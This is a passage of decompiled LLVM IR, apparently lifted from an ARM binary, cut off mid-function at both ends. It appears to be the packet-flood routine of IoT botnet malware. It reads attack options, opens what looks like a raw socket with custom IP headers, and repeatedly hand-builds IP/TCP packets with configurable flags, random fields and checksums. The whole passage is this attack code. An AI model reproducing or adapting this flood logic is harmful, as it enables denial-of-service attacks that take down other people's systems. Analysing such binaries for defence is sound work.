  %v5_bb58 = inttoptr i32 %v0_bb4c to i32*
  %v6_bb58 = call i32 @function_8570(i32 %v0_bb50, i32* %v5_bb58, i32 6, i32 65535)
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb58, i32* @r6, align 4
  %v0_bb70 = load i32, i32* @r4, align 4
  store i32 %v0_bb70, i32* %r0.global-to-local, align 4
  %v4_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v5_bb74 = call i32 @function_8570(i32 %v0_bb70, i32* %v4_bb74, i32 7, i32 65535)
  %v0_bb7c = load i32, i32* @r5, align 4
  store i32 %v0_bb7c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bb74, i32* @sl, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  %v4_bb90 = inttoptr i32 %v0_bb7c to i32*
  %v5_bb90 = call i32 @function_8570(i32 %v0_bb8c, i32* %v4_bb90, i32 17, i32 65535)
  %v0_bb9c = load i32, i32* @r5, align 4
  store i32 %v0_bb9c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bba8 = load i32, i32* @r4, align 4
  store i32 %v0_bba8, i32* %r0.global-to-local, align 4
  %v5_bbac = inttoptr i32 %v0_bb9c to i32*
  %v6_bbac = call i32 @function_8570(i32 %v0_bba8, i32* %v5_bbac, i32 18, i32 65535)
  %v0_bbb0 = load i32, i32* @r5, align 4
  store i32 %v0_bbb0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbc0 = load i32, i32* @r4, align 4
  store i32 %v0_bbc0, i32* %r0.global-to-local, align 4
  %v5_bbc4 = inttoptr i32 %v0_bbb0 to i32*
  %v6_bbc4 = call i32 @function_8570(i32 %v0_bbc0, i32* %v5_bbc4, i32 11, i32 0)
  %v0_bbc8 = load i32, i32* @r5, align 4
  store i32 %v0_bbc8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bbd8 = load i32, i32* @r4, align 4
  store i32 %v0_bbd8, i32* %r0.global-to-local, align 4
  %v5_bbdc = inttoptr i32 %v0_bbc8 to i32*
  %v6_bbdc = call i32 @function_8570(i32 %v0_bbd8, i32* %v5_bbdc, i32 12, i32 1)
  %v0_bbe0 = load i32, i32* @r5, align 4
  store i32 %v0_bbe0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbf0 = load i32, i32* @r4, align 4
  store i32 %v0_bbf0, i32* %r0.global-to-local, align 4
  %v5_bbf4 = inttoptr i32 %v0_bbe0 to i32*
  %v6_bbf4 = call i32 @function_8570(i32 %v0_bbf0, i32* %v5_bbf4, i32 13, i32 0)
  %v0_bbf8 = load i32, i32* @r5, align 4
  store i32 %v0_bbf8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc08 = load i32, i32* @r4, align 4
  store i32 %v0_bc08, i32* %r0.global-to-local, align 4
  %v5_bc0c = inttoptr i32 %v0_bbf8 to i32*
  %v6_bc0c = call i32 @function_8570(i32 %v0_bc08, i32* %v5_bc0c, i32 14, i32 0)
  %v0_bc10 = load i32, i32* @r5, align 4
  store i32 %v0_bc10, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r4, align 4
  store i32 %v0_bc20, i32* %r0.global-to-local, align 4
  %v5_bc24 = inttoptr i32 %v0_bc10 to i32*
  %v6_bc24 = call i32 @function_8570(i32 %v0_bc20, i32* %v5_bc24, i32 15, i32 0)
  %v0_bc28 = load i32, i32* @r5, align 4
  store i32 %v0_bc28, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc38 = load i32, i32* @r4, align 4
  store i32 %v0_bc38, i32* %r0.global-to-local, align 4
  %v5_bc3c = inttoptr i32 %v0_bc28 to i32*
  %v6_bc3c = call i32 @function_8570(i32 %v0_bc38, i32* %v5_bc3c, i32 16, i32 0)
  %v0_bc40 = load i32, i32* @r5, align 4
  store i32 %v0_bc40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc50 = load i32, i32* @r4, align 4
  store i32 %v0_bc50, i32* %r0.global-to-local, align 4
  %v5_bc54 = inttoptr i32 %v0_bc40 to i32*
  %v6_bc54 = call i32 @function_8570(i32 %v0_bc50, i32* %v5_bc54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc64 = load i32, i32* @r5, align 4
  store i32 %v0_bc64, i32* %r1.global-to-local, align 4
  %v0_bc68 = load i32, i32* @r4, align 4
  store i32 %v0_bc68, i32* %r0.global-to-local, align 4
  %v4_bc6c = inttoptr i32 %v0_bc64 to i32*
  %v5_bc6c = call i32 @function_8570(i32 %v0_bc68, i32* %v4_bc6c, i32 1, i32 1)
  %v2_bc78 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_bc78, i32* %r3.global-to-local, align 4
  %v1_bc7c = urem i32 %v5_bc6c, 256
  store i32 %v1_bc7c, i32* %ip.global-to-local, align 4
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bc88 = load i32, i32* @r4, align 4
  store i32 %v0_bc88, i32* %r0.global-to-local, align 4
  %v5_bc90 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc90 = call i32 @function_8504(i32 %v0_bc88, i32* %v5_bc90, i32 25, i32 %v2_bc78, i32 %v1_bc7c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bca4 = call i32 @function_11aec(i32 2, i32 3, i32 6)
  store i32 %v3_bca4, i32* %r0.global-to-local, align 4
  %v7_bca8 = icmp eq i32 %v3_bca4, -1
  store i1 %v7_bca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bca8, label %dec_label_pc_c170, label %dec_label_pc_bcb4

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_baa4
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcbc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcbc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bcd0 = call i32 @function_11aa8(i32 %v3_bca4, i32 0, i32 3, i32 %v6_bcbc, i32 4)
  store i32 %v5_bcd0, i32* %r0.global-to-local, align 4
  %v7_bcd4 = icmp eq i32 %v5_bcd0, -1
  store i1 %v7_bcd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bcd4, label %dec_label_pc_c168, label %dec_label_pc_bcdc

dec_label_pc_bcdc:                                ; preds = %dec_label_pc_bcb4
  %v0_bcdc = load i32, i32* %sb.global-to-local, align 4
  %v3_bcdc = mul i32 %v0_bcdc, 65536
  store i32 %v3_bcdc, i32* @r5, align 4
  %v0_bce0 = load i32, i32* @r6, align 4
  %v0_bce4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bcec = urem i32 %v0_bcdc, 65536
  store i32 %v3_bcec, i32* %r1.global-to-local, align 4
  %v3_bcf0 = urem i32 %v0_bce0, 65536
  store i32 %v3_bcf0, i32* %r2.global-to-local, align 4
  %v3_bcf4 = urem i32 %v0_bce4, 65536
  store i32 %v3_bcf4, i32* %r3.global-to-local, align 4
  %v0_bcf8 = load i32, i32* @r7, align 4
  %v2_bcf8 = icmp eq i32 %v0_bcf8, 0
  store i1 %v2_bcf8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bcf8, label %dec_label_pc_c17c, label %dec_label_pc_bd10

dec_label_pc_bd10:                                ; preds = %dec_label_pc_bcdc
  %v3_bd14 = mul i32 %v6_bc54, 65536
  %v1_bd18 = add i32 %v3_bd14, 2621440
  store i32 %v1_bd18, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bce0, 256
  %v3_bd3c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bce4, 256
  %v3_bd40 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bce0, 256
  %v4_bd44 = urem i32 %tmp61, 256
  %v5_bd44 = or i32 %v4_bd44, %v3_bd3c
  store i32 %v5_bd44, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bce4, 256
  %v4_bd48 = urem i32 %tmp62, 256
  %v5_bd48 = or i32 %v4_bd48, %v3_bd40
  store i32 %v5_bd48, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd18, 256
  %v3_bd5c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bcdc, 256
  %v3_bd60 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bb90, 256
  %v3_bd64 = and i32 %tmp65, 65280
  %v1_bd68 = urem i32 %v6_bbc4, 2
  %v1_bd6c = urem i32 %v6_bbdc, 2
  %tmp66 = udiv i32 %v5_bb90, 256
  %v4_bd70 = urem i32 %tmp66, 256
  %v5_bd70 = or i32 %v4_bd70, %v3_bd64
  %v4_bd74 = udiv i32 %v1_bd18, 16777216
  %v5_bd74 = or i32 %v3_bd5c, %v4_bd74
  store i32 %v5_bd74, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bcdc, 256
  %v4_bd78 = urem i32 %tmp67, 256
  %v5_bd78 = or i32 %v4_bd78, %v3_bd60
  store i32 %v5_bd78, i32* @fp, align 4
  %v1_bd94 = urem i32 %v6_bbf4, 2
  store i32 %v1_bd94, i32* %r2.global-to-local, align 4
  %v1_bd98 = urem i32 %v6_bc0c, 2
  store i32 %v1_bd98, i32* %r3.global-to-local, align 4
  %v1_bd9c = urem i32 %v6_bc24, 2
  store i32 %v1_bd9c, i32* %ip.global-to-local, align 4
  %v1_bda0 = urem i32 %v6_bc3c, 2
  store i32 %v1_bda0, i32* %r0.global-to-local, align 4
  %v1_bda4 = urem i32 %v6_bbf4, 256
  store i32 %v1_bda4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bad8, 16777216
  %v4_be18 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb14, 16777216
  %v4_be24 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bd6c
  %v4_be90 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bd94
  %v4_beac = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bd98
  %v4_bec0 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bd9c
  %v3_bed4 = and i32 %tmp74, 2
  %v2_bef8 = icmp eq i32 %v1_bda4, 0
  %v1_be20 = trunc i32 %v4_be18 to i8
  %extract.t = trunc i32 %v4_be24 to i8
  br label %dec_label_pc_bdc4

dec_label_pc_bdc4:                                ; preds = %bb70, %dec_label_pc_bd10
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bdd0 = call i32 @function_12654(i32 1510, i32 1)
  store i32 %v2_bdd0, i32* %r0.global-to-local, align 4
  %v2_bdd8 = load i32, i32* @r4, align 4
  %v5_bdd8 = mul i32 %v2_bdd8, 4
  %v6_bdd8 = add i32 %v5_bdd8, %v2_bac0
  %v7_bdd8 = inttoptr i32 %v6_bdd8 to i32*
  store i32 %v2_bdd0, i32* %v7_bdd8, align 4
  %v3_bddc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bddc, i32* %r2.global-to-local, align 4
  %v5_bde4 = mul i32 %v3_bddc, 24
  %v1_bde8 = load i32, i32* @r8, align 4
  %v2_bde8 = add i32 %v1_bde8, %v5_bde4
  store i32 %v2_bde8, i32* %r1.global-to-local, align 4
  store i32 %v2_bac0, i32* %r3.global-to-local, align 4
  %v4_bdf0 = mul i32 %v3_bddc, 4
  %v5_bdf0 = add i32 %v4_bdf0, %v2_bac0
  %v6_bdf0 = inttoptr i32 %v5_bdf0 to i32*
  %v7_bdf0 = load i32, i32* %v6_bdf0, align 4
  store i32 %v7_bdf0, i32* @r5, align 4
  %v1_bdf4 = inttoptr i32 %v7_bdf0 to i8*
  %v2_bdf4 = load i8, i8* %v1_bdf4, align 1
  %tmp75 = urem i8 %v2_bdf4, 16
  %v1_bdf8 = zext i8 %tmp75 to i32
  %v1_bdfc = or i32 %v1_bdf8, 64
  store i32 %v1_bdfc, i32* %r3.global-to-local, align 4
  %v1_be00 = trunc i32 %v1_bdfc to i8
  store i8 %v1_be00, i8* %v1_bdf4, align 1
  %v0_be04 = load i32, i32* @r5, align 4
  %v1_be04 = inttoptr i32 %v0_be04 to i8*
  %v2_be04 = load i8, i8* %v1_be04, align 1
  %v1_be08 = and i8 %v2_be04, -16
  %v1_be0c = or i8 %v1_be08, 5
  store i32 %v1_bb40, i32* %ip.global-to-local, align 4
  store i8 %v1_be0c, i8* %v1_be04, align 1
  store i32 %v4_be18, i32* %r0.global-to-local, align 4
  %v0_be1c = load i32, i32* %ip.global-to-local, align 4
  %v2_be1c = icmp eq i32 %v0_be1c, 0
  store i1 %v2_be1c, i1* %cpsr_z.global-to-local, align 1
  %v2_be20 = load i32, i32* @r5, align 4
  %v3_be20 = add i32 %v2_be20, 1
  %v4_be20 = inttoptr i32 %v3_be20 to i8*
  store i8 %v1_be20, i8* %v4_be20, align 1
  store i32 %v4_be24, i32* %r2.global-to-local, align 4
  %v0_be28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be28, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bdc4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be2c = load i32, i32* @r5, align 4
  %v4_be2c = add i32 %v3_be2c, 6
  %v5_be2c = inttoptr i32 %v4_be2c to i16*
  store i16 64, i16* %v5_be2c, align 2
  %v0_be34.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be34.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bdc4, %bb
  %v0_be34.off0 = phi i8 [ %extract.t, %dec_label_pc_bdc4 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be34 = load i32, i32* @r5, align 4
  %v3_be34 = add i32 %v2_be34, 8
  %v4_be34 = inttoptr i32 %v3_be34 to i8*
  store i8 %v0_be34.off0, i8* %v4_be34, align 1
  %v0_be38 = load i32, i32* %r3.global-to-local, align 4
  %v1_be38 = trunc i32 %v0_be38 to i8
  %v2_be38 = load i32, i32* @r5, align 4
  %v3_be38 = add i32 %v2_be38, 9
  %v4_be38 = inttoptr i32 %v3_be38 to i8*
  store i8 %v1_be38, i8* %v4_be38, align 1
  store i32 %v6_bc90, i32* %ip.global-to-local, align 4
  %v1_be40 = load i32, i32* @r5, align 4
  %v2_be40 = add i32 %v1_be40, 12
  %v3_be40 = inttoptr i32 %v2_be40 to i32*
  store i32 %v6_bc90, i32* %v3_be40, align 4
  %v0_be44 = load i32, i32* %r1.global-to-local, align 4
  %v1_be44 = add i32 %v0_be44, 16
  %v2_be44 = inttoptr i32 %v1_be44 to i32*
  %v3_be44 = load i32, i32* %v2_be44, align 4
  store i32 %v3_be44, i32* %r3.global-to-local, align 4
  %v0_be48 = load i32, i32* @sb, align 4
  %v1_be48 = trunc i32 %v0_be48 to i16
  %v2_be48 = load i32, i32* @r5, align 4
  %v3_be48 = add i32 %v2_be48, 2
  %v4_be48 = inttoptr i32 %v3_be48 to i16*
  store i16 %v1_be48, i16* %v4_be48, align 2
  %v0_be4c = load i32, i32* @fp, align 4
  %v1_be4c = trunc i32 %v0_be4c to i16
  %v2_be4c = load i32, i32* @r5, align 4
  %v3_be4c = add i32 %v2_be4c, 4
  %v4_be4c = inttoptr i32 %v3_be4c to i16*
  store i16 %v1_be4c, i16* %v4_be4c, align 2
  %v0_be50 = load i32, i32* %r3.global-to-local, align 4
  %v1_be50 = load i32, i32* @r5, align 4
  %v2_be50 = add i32 %v1_be50, 16
  %v3_be50 = inttoptr i32 %v2_be50 to i32*
  store i32 %v0_be50, i32* %v3_be50, align 4
  %v0_be54 = load i32, i32* @r6, align 4
  %v1_be54 = trunc i32 %v0_be54 to i16
  %v2_be54 = load i32, i32* @r5, align 4
  %v3_be54 = add i32 %v2_be54, 20
  %v4_be54 = inttoptr i32 %v3_be54 to i16*
  store i16 %v1_be54, i16* %v4_be54, align 2
  %v0_be58 = load i32, i32* @r5, align 4
  %v1_be58 = add i32 %v0_be58, 20
  store i32 %v1_be58, i32* @r4, align 4
  %v1_be5c = add i32 %v0_be58, 32
  %v2_be5c = inttoptr i32 %v1_be5c to i8*
  %v3_be5c = load i8, i8* %v2_be5c, align 1
  %v4_be5c = zext i8 %v3_be5c to i32
  store i32 %v4_be5c, i32* %r3.global-to-local, align 4
  %v1_be60 = add i32 %v0_be58, 33
  %v2_be60 = inttoptr i32 %v1_be60 to i8*
  %v3_be60 = load i8, i8* %v2_be60, align 1
  %v4_be60 = zext i8 %v3_be60 to i32
  store i32 %v1_bd68, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be5c, 16
  %v1_be68 = zext i8 %tmp76 to i32
  %v1_be6c = or i32 %v1_be68, 80
  store i32 %v1_be6c, i32* %r3.global-to-local, align 4
  %v1_be70 = and i32 %v4_be60, 223
  store i32 %v1_be70, i32* %r2.global-to-local, align 4
  %v1_be74 = trunc i32 %v1_be6c to i8
  store i8 %v1_be74, i8* %v2_be5c, align 1
  %v0_be78 = load i32, i32* %r2.global-to-local, align 4
  %v1_be78 = load i32, i32* %r0.global-to-local, align 4
  %v4_be78 = mul i32 %v1_be78, 32
  %v5_be78 = or i32 %v4_be78, %v0_be78
  store i32 %v5_be78, i32* %r2.global-to-local, align 4
  store i32 %v5_bd70, i32* %r1.global-to-local, align 4
  %v1_be80 = trunc i32 %v5_be78 to i8
  %v2_be80 = load i32, i32* @r4, align 4
  %v3_be80 = add i32 %v2_be80, 13
  %v4_be80 = inttoptr i32 %v3_be80 to i8*
  store i8 %v1_be80, i8* %v4_be80, align 1
  %v0_be84 = load i32, i32* @r4, align 4
  %v1_be84 = add i32 %v0_be84, 13
  %v2_be84 = inttoptr i32 %v1_be84 to i8*
  %v3_be84 = load i8, i8* %v2_be84, align 1
  %v4_be84 = zext i8 %v3_be84 to i32
  store i32 %v1_bd6c, i32* %r2.global-to-local, align 4
  %v1_be8c = and i32 %v4_be84, 239
  %v5_be90 = or i32 %v1_be8c, %v4_be90
  store i32 %v5_be90, i32* %r3.global-to-local, align 4
  %v0_be94 = load i32, i32* %r1.global-to-local, align 4
  %v2_be94 = add i32 %v0_be84, 4
  %v3_be94 = inttoptr i32 %v2_be94 to i32*
  store i32 %v0_be94, i32* %v3_be94, align 4
  %v0_be98 = load i32, i32* @sl, align 4
  %v1_be98 = trunc i32 %v0_be98 to i16
  %v2_be98 = load i32, i32* @r4, align 4
  %v3_be98 = add i32 %v2_be98, 2
  %v4_be98 = inttoptr i32 %v3_be98 to i16*
  store i16 %v1_be98, i16* %v4_be98, align 2
  %v0_be9c = load i32, i32* %r3.global-to-local, align 4
  %v1_be9c = trunc i32 %v0_be9c to i8
  %v2_be9c = load i32, i32* @r4, align 4
  %v3_be9c = add i32 %v2_be9c, 13
  %v4_be9c = inttoptr i32 %v3_be9c to i8*
  store i8 %v1_be9c, i8* %v4_be9c, align 1
  %v0_bea0 = load i32, i32* @r4, align 4
  %v1_bea0 = add i32 %v0_bea0, 13
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bd94, i32* %r3.global-to-local, align 4
  %v1_bea8 = and i32 %v4_bea0, 247
  %v5_beac = or i32 %v1_bea8, %v4_beac
  store i32 %v5_beac, i32* %r2.global-to-local, align 4
  %v1_beb0 = trunc i32 %v5_beac to i8
  store i8 %v1_beb0, i8* %v2_bea0, align 1
  %v0_beb4 = load i32, i32* @r4, align 4
  %v1_beb4 = add i32 %v0_beb4, 13
  %v2_beb4 = inttoptr i32 %v1_beb4 to i8*
  %v3_beb4 = load i8, i8* %v2_beb4, align 1
  %v4_beb4 = zext i8 %v3_beb4 to i32
  store i32 %v1_bd98, i32* %ip.global-to-local, align 4
  %v1_bebc = and i32 %v4_beb4, 251
  %v5_bec0 = or i32 %v1_bebc, %v4_bec0
  store i32 %v5_bec0, i32* %r3.global-to-local, align 4
  %v1_bec4 = trunc i32 %v5_bec0 to i8
  store i8 %v1_bec4, i8* %v2_beb4, align 1
  %v0_bec8 = load i32, i32* @r4, align 4
  %v1_bec8 = add i32 %v0_bec8, 13
  %v2_bec8 = inttoptr i32 %v1_bec8 to i8*
  %v3_bec8 = load i8, i8* %v2_bec8, align 1
  %v4_bec8 = zext i8 %v3_bec8 to i32
  store i32 %v1_bd9c, i32* %r0.global-to-local, align 4
  %v1_bed0 = and i32 %v4_bec8, 253
  %v4_bed4 = or i32 %v1_bed0, %v3_bed4
  store i32 %v4_bed4, i32* %r2.global-to-local, align 4
  %v1_bed8 = trunc i32 %v4_bed4 to i8
  store i8 %v1_bed8, i8* %v2_bec8, align 1
  %v0_bedc = load i32, i32* @r4, align 4
  %v1_bedc = add i32 %v0_bedc, 13
  %v2_bedc = inttoptr i32 %v1_bedc to i8*
  %v3_bedc = load i8, i8* %v2_bedc, align 1
  %v4_bedc = zext i8 %v3_bedc to i32
  store i32 %v1_bda0, i32* %r1.global-to-local, align 4
  %v1_bee4 = and i32 %v4_bedc, 254
  %v2_bee8 = or i32 %v1_bee4, %v1_bda0
  store i32 %v2_bee8, i32* %r3.global-to-local, align 4
  %v1_beec = trunc i32 %v2_bee8 to i8
  store i8 %v1_beec, i8* %v2_bedc, align 1
  %v0_bef0 = call i32 @function_e0d0()
  %v1_bef0 = trunc i32 %v0_bef0 to i16
  store i32 %v0_bef0, i32* %r0.global-to-local, align 4
  store i32 %v1_bda4, i32* %r2.global-to-local, align 4
  store i1 %v2_bef8, i1* %cpsr_z.global-to-local, align 1
  %v3_bf04.pre = load i32, i32* @r4, align 4
  br i1 %v2_bef8, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_befc = add i32 %v3_bf04.pre, 13
  %v3_befc = inttoptr i32 %v2_befc to i8*
  %v4_befc = load i8, i8* %v3_befc, align 1
  %v5_befc = zext i8 %v4_befc to i32
  %v2_bf00 = or i32 %v5_befc, 8
  store i32 %v2_bf00, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf04 = add i32 %v3_bf04.pre, 14
  %v5_bf04 = inttoptr i32 %v4_bf04 to i16*
  store i16 %v1_bef0, i16* %v5_bf04, align 2
  store i32 %v6_bc54, i32* %r1.global-to-local, align 4
  %v0_bf0c = load i32, i32* @r5, align 4
  %v1_bf0c = add i32 %v0_bf0c, 40
  store i32 %v1_bf0c, i32* %r0.global-to-local, align 4
  br i1 %v2_bef8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf10 = load i32, i32* @r3, align 4
  %v2_bf10 = trunc i32 %v1_bf10 to i8
  %v3_bf10 = load i32, i32* @r4, align 4
  %v4_bf10 = add i32 %v3_bf10, 13
  %v5_bf10 = inttoptr i32 %v4_bf10 to i8*
  store i8 %v2_bf10, i8* %v5_bf10, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf14 = inttoptr i32 %v1_bf0c to i16*
  %v3_bf14 = call i32 @function_e264(i16* %v2_bf14, i32 %v6_bc54)
  store i32 %v3_bf14, i32* %r0.global-to-local, align 4
  %v3_bf18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf18, i32* %r3.global-to-local, align 4
  %v1_bf1c = add i32 %v3_bf18, 1
  store i32 %v1_bf1c, i32* @r4, align 4
  %v1_bf20 = load i32, i32* @r7, align 4
  %v9_bf20 = icmp eq i32 %v1_bf1c, %v1_bf20
  store i1 %v9_bf20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf1c, i32* %stack_var_-44, align 4
  %v5_bf28 = icmp slt i32 %v1_bf1c, %v1_bf20
  br i1 %v5_bf28, label %dec_label_pc_bdc4, label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %bb70
  store i32 %v6_bc54, i32* %r3.global-to-local, align 4
  %v1_bf30 = add i32 %v6_bc54, 20
  store i32 %v1_bf30, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bf38

dec_label_pc_bf38:                                ; preds = %dec_label_pc_c17c, %dec_label_pc_bf2c
  %v0_bf508 = phi i32 [ %v1_bf20, %dec_label_pc_bf2c ], [ 0, %dec_label_pc_c17c ]
  %stack_var_-140.0 = phi i32 [ %v3_bd14, %dec_label_pc_bf2c ], [ %v3_c188, %dec_label_pc_c17c ]
  %storemerge = add i32 %v6_bc54, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf3c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf3c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf3c, 256
  %v3_bf44 = and i32 %tmp71, 65280
  store i32 %v3_bf44, i32* %r3.global-to-local, align 4
  %v4_bf48 = udiv i32 %v1_bf3c, 16777216
  %v5_bf48 = or i32 %v3_bf44, %v4_bf48
  store i32 %v5_bf48, i32* @sl, align 4
  %v3_c0e8 = icmp eq i32 %v3_bcec, 65535
  %v2_c14c = icmp eq i32 %v1_bc7c, 0
  %v2_bf88 = icmp eq i32 %v6_bc90, -1
  %v7_bf88 = icmp eq i32 %v6_bc90, -1
  br label %dec_label_pc_bf4c

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_bf4c, %dec_label_pc_c064, %dec_label_pc_bf38
  %v0_bf50 = phi i32 [ %v0_bf508, %dec_label_pc_bf38 ], [ 0, %dec_label_pc_c064 ], [ 0, %dec_label_pc_bf4c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf50 = icmp eq i32 %v0_bf50, 0
  store i1 %v2_bf50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf50, label %dec_label_pc_bf4c, label %dec_label_pc_bf5c

dec_label_pc_bf5c:                                ; preds = %dec_label_pc_bf4c, %dec_label_pc_c064
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf60

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bfe0, %dec_label_pc_bf5c
  %v1_bf74 = phi i32 [ %v1_c054, %dec_label_pc_bfe0 ], [ 0, %dec_label_pc_bf5c ]
  %v5_bf64 = mul i32 %v1_bf74, 24
  %v1_bf68 = load i32, i32* @r8, align 4
  %v2_bf68 = add i32 %v1_bf68, %v5_bf64
  store i32 %v2_bf68, i32* %r3.global-to-local, align 4
  store i32 %v2_bac0, i32* %ip.global-to-local, align 4
  %v1_bf70 = add i32 %v2_bf68, 20
  %v2_bf70 = inttoptr i32 %v1_bf70 to i8*
  %v3_bf70 = load i8, i8* %v2_bf70, align 1
  %v4_bf70 = zext i8 %v3_bf70 to i32
  store i32 %v4_bf70, i32* %r2.global-to-local, align 4
  %v4_bf74 = mul i32 %v1_bf74, 4
  %v5_bf74 = add i32 %v4_bf74, %v2_bac0
  %v6_bf74 = inttoptr i32 %v5_bf74 to i32*
  %v7_bf74 = load i32, i32* %v6_bf74, align 4
  store i32 %v7_bf74, i32* @r5, align 4
  %v7_bf78 = icmp eq i8 %v3_bf70, 31
  store i1 %v7_bf78, i1* %cpsr_z.global-to-local, align 1
  %v1_bf7c = add i32 %v7_bf74, 20
  store i32 %v1_bf7c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bf70, 32
  br i1 %tmp77, label %dec_label_pc_c078, label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf60
  store i32 %v6_bc90, i32* %r0.global-to-local, align 4
  store i1 %v7_bf88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bf88, label %dec_label_pc_c0d8, label %dec_label_pc_bf90

dec_label_pc_bf90:                                ; preds = %dec_label_pc_c078, %dec_label_pc_bf84
  store i32 %v3_bcec, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c0e8, label %dec_label_pc_c0f4, label %dec_label_pc_bfa4

dec_label_pc_bfa4:                                ; preds = %dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge, %dec_label_pc_bf90
  %v1_bfa8 = phi i32 [ %v1_bfa8.pre, %dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge ], [ 65535, %dec_label_pc_bf90 ]
